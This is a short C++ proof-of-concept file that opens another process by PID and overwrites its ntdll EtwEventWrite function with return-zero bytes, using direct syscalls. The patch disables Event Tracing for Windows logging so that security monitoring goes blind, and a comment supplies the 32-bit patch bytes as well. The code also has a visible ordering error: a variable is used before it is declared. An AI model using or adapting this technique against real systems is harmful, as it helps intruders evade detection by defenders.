// PoC to patch EtwEventWrite in a remote process
// Example: PatchETWRemote.exe <PID>
// Example: PatchETWRemote.exe 5412

#include <windows.h>
#include <iostream>
#include "syscalls.h"


int main(int argc, char** argv) {

	char* PID = argv[1];
	int targetPID = atoi(PID);
	
	HANDLE targetProcHandle;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)targetPID;
	cid.UniqueThread = 0;
  
	DWORD oldprotect1;
	LPVOID lpBaseAddress = EEWAddress;
	ULONG NewProtection1;

	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

	NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid); 
	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
	NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

	return 0;
  
}
